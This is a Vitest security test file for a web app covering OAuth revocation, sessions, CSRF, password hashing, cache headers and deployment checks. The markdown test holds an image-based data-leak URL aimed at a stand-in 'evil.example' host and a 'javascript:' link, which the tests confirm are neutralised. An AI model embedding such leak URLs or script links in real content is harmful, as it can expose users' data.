// Audit 2026-11-23: A3 (revocation, lifetimes), D5 (deletion pages), A8, A9, A11, A12, D6, D9.
import { describe, expect, it } from "vitest";
import { hashPassword, needsRehash } from "../src/auth/passwords.js";
import { loadConfig } from "../src/config.js";
import { renderMarkdown } from "../src/web/render.js";
import { BASE, csrfFrom, makeTestApp, signIn, type TestApp } from "./helpers.js";
import { grant, mcpStatus, tokenRequest } from "./oauth-flow.js";

function post(body: Record<string, string>, cookie?: string, headers: Record<string, string> = { origin: BASE }): RequestInit {
  return {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded", ...headers, ...(cookie ? { cookie } : {}) },
    body: new URLSearchParams(body).toString(),
    redirect: "manual",
  };
}

async function page(t: TestApp, path: string, cookie: string): Promise<string> {
  return (await t.fetch(path, { headers: { cookie } })).text();
}

async function withApp(env: Record<string, string>, fn: (t: TestApp) => Promise<void>) {
  const t = await makeTestApp(env);
  try {
    await fn(t);
  } finally {
    await t.close();
  }
}

describe("A3: connected apps can be revoked and expire", () => {
  it("lists a connected app and disconnecting it ends its access and refresh tokens", () =>
    withApp({}, async (t) => {
      const cookie = await signIn(t);
      const g = await grant(t, cookie, "My Agent");
      expect(await mcpStatus(t, g.access)).toBe(200);
      const account = await page(t, "/account/apps", cookie);
      expect(account).toContain("My Agent");
      const family = /action="\/account\/apps\/([^/]+)\/revoke"/.exec(account)![1]!;
      const res = await t.fetch(`/account/apps/${family}/revoke`, post({ _csrf: csrfFrom(account) }, cookie));
      expect(res.status).toBe(302);
      expect(await mcpStatus(t, g.access)).toBe(401);
      const refreshed = await tokenRequest(t, { grant_type: "refresh_token", refresh_token: g.refresh, client_id: g.clientId });
      expect(refreshed.status).toBe(400);
      expect(await page(t, "/account/apps", cookie)).not.toContain("My Agent");
    }));

  it("refuses to revoke without the CSRF token", () =>
    withApp({}, async (t) => {
      const cookie = await signIn(t);
      const g = await grant(t, cookie);
      const [row] = await t.db.query<{ family_id: string }>("SELECT family_id FROM oauth_grants");
      const res = await t.fetch(`/account/apps/${row!.family_id}/revoke`, post({}, cookie));
      expect(res.status).toBe(403);
      expect(await mcpStatus(t, g.access)).toBe(200);
    }));

  it("supports RFC 7009 revocation at /oauth/revoke, only by the token's own client", () =>
    withApp({}, async (t) => {
      const cookie = await signIn(t);
      const meta = (await (await t.fetch("/.well-known/oauth-authorization-server")).json()) as Record<string, unknown>;
      expect(meta.revocation_endpoint).toBe(`${BASE}/oauth/revoke`);
      const a = await grant(t, cookie, "A");
      const b = await grant(t, cookie, "B");
      // Another client presenting A's token changes nothing, and gets the same 200.
      const wrong = await tokenRequest(t, { token: a.refresh, client_id: b.clientId }, "/oauth/revoke");
      expect(wrong.status).toBe(200);
      expect(await mcpStatus(t, a.access)).toBe(200);
      const res = await tokenRequest(t, { token: a.refresh, token_type_hint: "refresh_token", client_id: a.clientId }, "/oauth/revoke");
      expect(res.status).toBe(200);
      expect(await mcpStatus(t, a.access)).toBe(401);
      expect(await mcpStatus(t, b.access)).toBe(200);
      const unknown = await tokenRequest(t, { token: "awr_nothing", client_id: a.clientId }, "/oauth/revoke");
      expect(unknown.status).toBe(200);
    }));

  it("ends a grant at its absolute lifetime however often it refreshes", () =>
    withApp({}, async (t) => {
      const cookie = await signIn(t);
      const g = await grant(t, cookie);
      // Ten minutes left: refreshed tokens never outlive the grant.
      await t.db.query("UPDATE oauth_grants SET expires_at = now() + interval '10 minutes'");
      const r1 = await tokenRequest(t, { grant_type: "refresh_token", refresh_token: g.refresh, client_id: g.clientId });
      const b1 = (await r1.json()) as { expires_in: number; refresh_token: string };
      expect(r1.status).toBe(200);
      expect(b1.expires_in).toBeLessThanOrEqual(600);
      const [rt] = await t.db.query<{ ok: boolean }>(
        "SELECT bool_and(r.expires_at <= g.expires_at) AS ok FROM oauth_refresh_tokens r JOIN oauth_grants g USING (family_id) WHERE r.used_at IS NULL",
      );
      expect(rt!.ok).toBe(true);
      await t.db.query("UPDATE oauth_grants SET expires_at = now() - interval '1 second'");
      const r2 = await tokenRequest(t, { grant_type: "refresh_token", refresh_token: b1.refresh_token, client_id: g.clientId });
      expect(r2.status).toBe(400);
      expect(((await r2.json()) as { error_description: string }).error_description).toContain("ended");
    }));

  it("records a 90-day grant lifetime by default", () =>
    withApp({}, async (t) => {
      const cookie = await signIn(t);
      await grant(t, cookie);
      const [row] = await t.db.query<{ days: number }>("SELECT round(extract(epoch FROM expires_at - created_at) / 86400)::int AS days FROM oauth_grants");
      expect(row!.days).toBe(90);
    }));

  it("lets personal access tokens expire", () =>
    withApp({}, async (t) => {
      const cookie = await signIn(t);
      const tokens = await page(t, "/tokens", cookie);
      const created = await (await t.fetch("/tokens", post({ _csrf: csrfFrom(tokens), name: "short", expires: "30" }, cookie))).text();
      const token = /(anywr_[A-Za-z0-9_-]+)/.exec(created)![1]!;
      const [row] = await t.db.query<{ days: number }>(
        "SELECT round(extract(epoch FROM expires_at - created_at) / 86400)::int AS days FROM personal_access_tokens WHERE name = 'short'",
      );
      expect(row!.days).toBe(30);
      expect((await t.api("GET", "/me", undefined, token)).status).toBe(200);
      await t.db.query("UPDATE personal_access_tokens SET expires_at = now() - interval '1 second' WHERE name = 'short'");
      expect((await t.api("GET", "/me", undefined, token)).status).toBe(401);
    }));
});

describe("A3: password change and sign-out everywhere", () => {
  it("changes the password, ends other sessions, keeps this browser signed in, and can disconnect everything", () =>
    withApp({}, async (t) => {
      const here = await signIn(t);
      const elsewhere = await signIn(t);
      const g = await grant(t, here);
      const account = await page(t, "/account", here);

      const wrong = await t.fetch("/account/password", post({ _csrf: csrfFrom(account), current: "nope nope nope", password: "brand new password", confirm: "brand new password" }, here));
      expect(wrong.status).toBe(400);

      const res = await t.fetch(
        "/account/password",
        post({ _csrf: csrfFrom(account), current: "long enough pw", password: "brand new password", confirm: "brand new password", disconnect: "1" }, here),
      );
      expect(res.status).toBe(302);
      const fresh = res.headers.get("set-cookie")!.split(";")[0]!;
      expect((await t.fetch("/account", { headers: { cookie: fresh }, redirect: "manual" })).status).toBe(200);
      expect((await t.fetch("/account", { headers: { cookie: elsewhere }, redirect: "manual" })).status).toBe(302);
      expect((await t.fetch("/account", { headers: { cookie: here }, redirect: "manual" })).status).toBe(302);
      expect(await mcpStatus(t, g.access)).toBe(401);
      expect((await t.api("GET", "/me")).status).toBe(401); // the PAT was revoked too
      await expect(signIn(t)).rejects.toThrow();
      expect(await signIn(t, "me@example.com", "brand new password")).toMatch(/anywr_session=/);
    }));

  it("signs out every web session", () =>
    withApp({}, async (t) => {
      const a = await signIn(t);
      const b = await signIn(t);
      const account = await page(t, "/account", a);
      const res = await t.fetch("/account/signout-everywhere", post({ _csrf: csrfFrom(account) }, a));
      expect(res.status).toBe(302);
      for (const cookie of [a, b]) expect((await t.fetch("/projects", { headers: { cookie }, redirect: "manual" })).status).toBe(302);
      expect((await t.api("GET", "/me")).status).toBe(200);
    }));
});

describe("D5: delete project and delete account pages", () => {
  it("deletes a project only with CSRF, the typed slug and the password", () =>
    withApp({}, async (t) => {
      await t.api("POST", "/projects", { name: "Gone Soon" });
      const cookie = await signIn(t);
      expect(await page(t, "/projects/gone-soon", cookie)).toContain('href="/projects/gone-soon/delete"');
      const form = await page(t, "/projects/gone-soon/delete", cookie);
      const csrf = csrfFrom(form);
      expect((await t.fetch("/projects/gone-soon/delete", post({ confirm: "gone-soon", password: "long enough pw" }, cookie))).status).toBe(403);
      expect((await t.fetch("/projects/gone-soon/delete", post({ _csrf: csrf, confirm: "nope", password: "long enough pw" }, cookie))).status).toBe(422);
      expect((await t.fetch("/projects/gone-soon/delete", post({ _csrf: csrf, confirm: "gone-soon", password: "wrong password!" }, cookie))).status).toBe(400);
      const res = await t.fetch("/projects/gone-soon/delete", post({ _csrf: csrf, confirm: "gone-soon", password: "long enough pw" }, cookie));
      expect(res.status).toBe(302);
      expect((await t.api("GET", "/projects/gone-soon")).status).toBe(404);
    }));

  it("deletes the account and everything in it after re-entering the password", () =>
    withApp({}, async (t) => {
      await t.api("POST", "/projects", { name: "Mine" });
      const cookie = await signIn(t);
      const account = await page(t, "/account", cookie);
      const csrf = csrfFrom(account);
      expect((await t.fetch("/account/delete", post({ _csrf: csrf, email: "me@example.com", password: "wrong password!" }, cookie))).status).toBe(400);
      expect((await t.fetch("/account/delete", post({ _csrf: csrf, email: "other@example.com", password: "long enough pw" }, cookie))).status).toBe(422);
      const res = await t.fetch("/account/delete", post({ _csrf: csrf, email: "ME@example.com", password: "long enough pw" }, cookie));
      expect(res.status).toBe(200);
      expect(await t.db.query("SELECT 1 FROM users")).toHaveLength(0);
      expect(await t.db.query("SELECT 1 FROM projects")).toHaveLength(0);
      expect(await t.db.query("SELECT 1 FROM pages")).toHaveLength(0);
      expect((await t.api("GET", "/me")).status).toBe(401);
    }));

  it("counts failed re-authentication against the account lockout", () =>
    withApp({ ANYWHERE_SIGNIN_EMAIL_LIMIT: "2" }, async (t) => {
      await t.api("POST", "/projects", { name: "Keep" });
      const cookie = await signIn(t);
      const csrf = csrfFrom(await page(t, "/projects/keep/delete", cookie));
      for (let i = 0; i < 2; i++) await t.fetch("/projects/keep/delete", post({ _csrf: csrf, confirm: "keep", password: "guess guess guess" }, cookie));
      const res = await t.fetch("/projects/keep/delete", post({ _csrf: csrf, confirm: "keep", password: "long enough pw" }, cookie));
      expect(res.status).toBe(400);
      expect(await res.text()).toContain("Too many failed attempts");
      expect((await t.api("GET", "/projects/keep")).status).toBe(200);
    }));
});

describe("A12: sessions", () => {
  it("ends the session already in the browser when someone signs in", () =>
    withApp({}, async (t) => {
      const first = await signIn(t);
      await t.fetch("/signup", post({ email: "b@example.com", password: "another long pw" }));
      const res = await t.fetch("/signin", post({ email: "b@example.com", password: "another long pw" }, first));
      expect(res.status).toBe(302);
      expect((await t.fetch("/projects", { headers: { cookie: first }, redirect: "manual" })).status).toBe(302);
    }));

  it("ends a session after the idle timeout", () =>
    withApp({}, async (t) => {
      const cookie = await signIn(t);
      expect((await t.fetch("/projects", { headers: { cookie }, redirect: "manual" })).status).toBe(200);
      await t.db.query("UPDATE web_sessions SET last_seen_at = now() - interval '15 days'");
      expect((await t.fetch("/projects", { headers: { cookie }, redirect: "manual" })).status).toBe(302);
    }));

  it("uses the __Host- cookie prefix on https", () =>
    withApp({}, async (t) => {
      const res = await t.fetch("/signin", post({ email: "me@example.com", password: "long enough pw" }));
      const set = res.headers.get("set-cookie")!;
      expect(set).toMatch(/^__Host-anywr_session=/);
      expect(set).toMatch(/Secure/);
      expect(set).toMatch(/Path=\//);
      expect(set).not.toMatch(/Domain=/i);
    }));
});

describe("A11: login CSRF", () => {
  it("refuses sign-in with neither Origin nor Sec-Fetch-Site: same-origin", () =>
    withApp({}, async (t) => {
      const body = { email: "me@example.com", password: "long enough pw" };
      expect((await t.fetch("/signin", post(body, undefined, {}))).status).toBe(403);
      expect((await t.fetch("/signin", post(body, undefined, { "sec-fetch-site": "cross-site" }))).status).toBe(403);
      expect((await t.fetch("/signin", post(body, undefined, { origin: "https://evil.example" }))).status).toBe(403);
      expect((await t.fetch("/signin", post(body, undefined, { "sec-fetch-site": "same-origin" }))).status).toBe(302);
      expect((await t.fetch("/signup", post({ email: "c@example.com", password: "another long pw" }, undefined, {}))).status).toBe(403);
    }));
});

describe("A8: password hashing", () => {
  it("hashes with scrypt N=2^15, r=8, p=3 and upgrades older hashes at sign-in", () =>
    withApp({}, async (t) => {
      const fresh = await hashPassword("whatever long");
      expect(fresh.split(":").slice(0, 4)).toEqual(["scrypt", "32768", "8", "3"]);
      expect(needsRehash(fresh)).toBe(false);
      // An old-format hash (N=2^14, r=8, p=1) of the test user's password.
      const { scrypt } = await import("node:crypto");
      const salt = Buffer.alloc(16, 7);
      const key = await new Promise<Buffer>((res, rej) => scrypt("long enough pw", salt, 64, { N: 16384, r: 8, p: 1 }, (e, k) => (e ? rej(e) : res(k))));
      await t.db.query("UPDATE users SET password_hash = $1", [`scrypt:16384:${salt.toString("base64")}:${key.toString("base64")}`]);
      await signIn(t);
      const [row] = await t.db.query<{ password_hash: string }>("SELECT password_hash FROM users");
      expect(row!.password_hash.startsWith("scrypt:32768:8:3:")).toBe(true);
      await signIn(t);
    }));
});

describe("A9: transport security", () => {
  it("sends HSTS on an https BASE_URL", () =>
    withApp({}, async (t) => {
      expect((await t.fetch("/signin")).headers.get("strict-transport-security")).toBe("max-age=63072000");
    }));

  it("refuses to start in production without an https BASE_URL, except on loopback", () => {
    expect(() => loadConfig({ NODE_ENV: "production", BASE_URL: "http://anywr.example" })).toThrow(/https/);
    expect(() => loadConfig({ NODE_ENV: "production" })).not.toThrow(); // http://localhost:3000
    expect(() => loadConfig({ NODE_ENV: "production", BASE_URL: "https://anywr.example" })).not.toThrow();
  });
});

describe("D6: no remote images", () => {
  it("renders markdown images as links and forbids remote images in the CSP", () =>
    withApp({}, async (t) => {
      const out = renderMarkdown("![secret](https://evil.example/leak?d=abc) and ![x](javascript:alert(1))");
      expect(out).not.toContain("<img");
      expect(out).toContain('href="https://evil.example/leak?d=abc"');
      expect(out).toContain("Image: secret");
      expect(out).not.toContain("javascript:");
      await t.api("POST", "/projects", { name: "Pics" });
      const cookie = await signIn(t);
      const res = await t.fetch("/projects/pics/pages/overview.md", { headers: { cookie } });
      expect(res.headers.get("content-security-policy")).toContain("img-src 'self' data:");
    }));
});

describe("D9: no caching of authenticated responses", () => {
  it("sends Cache-Control: private, no-store on API, MCP, export and signed-in pages", () =>
    withApp({}, async (t) => {
      await t.api("POST", "/projects", { name: "Cached" });
      expect((await t.api("GET", "/projects")).headers.get("cache-control")).toBe("private, no-store");
      expect((await t.api("GET", "/projects/cached/export")).headers.get("cache-control")).toBe("private, no-store");
      const cookie = await signIn(t);
      for (const path of ["/projects", "/projects/cached", "/projects/cached/pages/overview.md", "/projects/cached/export.zip"]) {
        expect((await t.fetch(path, { headers: { cookie } })).headers.get("cache-control"), path).toBe("private, no-store");
      }
      const mcp = await t.fetch("/mcp", {
        method: "POST",
        headers: { authorization: `Bearer ${t.token}`, "content-type": "application/json", accept: "application/json, text/event-stream" },
        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "ping" }),
      });
      expect(mcp.headers.get("cache-control")).toBe("private, no-store");
    }));
});

describe("D10: deployment defaults", () => {
  it("refuses the embedded database in production unless allowed", async () => {
    const { embeddedDbRefusal } = await import("../src/config.js");
    const prod = { NODE_ENV: "production", BASE_URL: "https://anywr.example" };
    expect(embeddedDbRefusal(loadConfig(prod), prod)).toMatch(/DATABASE_URL/);
    expect(embeddedDbRefusal(loadConfig({ ...prod, DATABASE_URL: "postgres://x" }), prod)).toBeNull();
    const allowed = { ...prod, ANYWHERE_ALLOW_EMBEDDED_DB: "1" };
    expect(embeddedDbRefusal(loadConfig(allowed), allowed)).toBeNull();
    expect(embeddedDbRefusal(loadConfig({}), {})).toBeNull();
  });

  it("compose needs a database password, publishes on loopback and pins images", async () => {
    const { readFileSync } = await import("node:fs");
    const compose = readFileSync(new URL("../../../docker-compose.yml", import.meta.url), "utf8");
    const dockerfile = readFileSync(new URL("../../../Dockerfile", import.meta.url), "utf8");
    expect(compose).not.toContain("POSTGRES_PASSWORD:-");
    expect(compose).toContain('"127.0.0.1:${PORT:-3000}:3000"');
    expect(compose).toMatch(/image: postgres:17@sha256:[0-9a-f]{64}/);
    for (const from of dockerfile.match(/^FROM .*/gm)!) expect(from).toMatch(/@sha256:[0-9a-f]{64}/);
  });
});

describe("A10: token audience", () => {
  it("accepts an OAuth token on /mcp only when it was issued for the MCP resource", () =>
    withApp({}, async (t) => {
      const cookie = await signIn(t);
      const g = await grant(t, cookie);
      expect(await mcpStatus(t, g.access)).toBe(200);
      await t.db.query("UPDATE oauth_access_tokens SET resource = 'https://other.example/mcp'");
      expect(await mcpStatus(t, g.access)).toBe(401);
      expect((await t.api("GET", "/me", undefined, g.access)).status).toBe(401);
      // docs/api.md: /api/v1 takes personal access tokens only, so even a valid MCP token is refused there.
      await t.db.query("UPDATE oauth_access_tokens SET resource = $1", [`${BASE}/mcp`]);
      expect(await mcpStatus(t, g.access)).toBe(200);
      expect((await t.api("GET", "/me", undefined, g.access)).status).toBe(401);
    }));
});

describe("A12: purging expired rows", () => {
  it("deletes expired sessions, codes, tokens and grants, and old rate-limit windows", () =>
    withApp({}, async (t) => {
      const cookie = await signIn(t);
      await grant(t, cookie);
      await signIn(t);
      await t.db.query("UPDATE web_sessions SET expires_at = now() - interval '1 minute'");
      await t.db.query("UPDATE oauth_codes SET expires_at = now() - interval '2 days'");
      await t.db.query("UPDATE oauth_grants SET expires_at = now() - interval '2 days'");
      await t.db.query("UPDATE oauth_access_tokens SET expires_at = now() - interval '2 days'");
      await t.db.query("INSERT INTO rate_limits (key, window_start, count) VALUES ('old', 0, 1)");
      const { purgeExpired } = await import("../src/index.js");
      // Requests start a purge now and then, which may run alongside: check the outcome, not counts.
      const counts = await purgeExpired(t.db);
      expect(Object.keys(counts)).toContain("rate_limits");
      expect(await t.db.query("SELECT 1 FROM rate_limits WHERE key = 'old'")).toHaveLength(0);
      for (const table of ["web_sessions", "oauth_codes", "oauth_grants", "oauth_access_tokens", "oauth_refresh_tokens"]) {
        expect(await t.db.query(`SELECT 1 FROM ${table}`), table).toHaveLength(0);
      }
    }));
});
